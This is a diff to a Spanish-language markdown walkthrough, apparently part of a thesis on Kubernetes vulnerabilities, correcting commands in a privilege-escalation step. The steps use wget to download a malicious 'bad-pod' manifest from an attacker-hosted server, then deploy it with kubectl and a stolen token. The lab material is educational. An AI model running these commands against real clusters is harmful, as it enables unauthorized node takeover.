@@ -100,13 +100,14 @@ Como es posible crear pods, para escalar al nodo, es posible crear un [badpods](
 1. Copiamos el archivo en la el pod del servicio web, esto lo podemos hacer igual que antes con el servidor python, utilizando los comandos:
 
 ``` bash 
-wget 192.168.1.131:8000/bad-pod.yaml ./kubectl apply -f bad-pod.yaml --token=$token
+wget 192.168.1.131:8000/bad-pod.yaml 
+./kubectl apply -f bad-pod.yaml --token=$token
 ```
 
 2. Vemos que se ha creado es nuevo pod:
 
 ``` bash
-./kubectel get pods --token=$token
+./kubectl get pods --token=$token
 ```
 
 ![https://raw.githubusercontent.com/Alfesito/TFG-kubevuln/main/images/create%20bad-pod.png](https://raw.githubusercontent.com/Alfesito/TFG-kubevuln/main/images/create%20bad-pod.png)
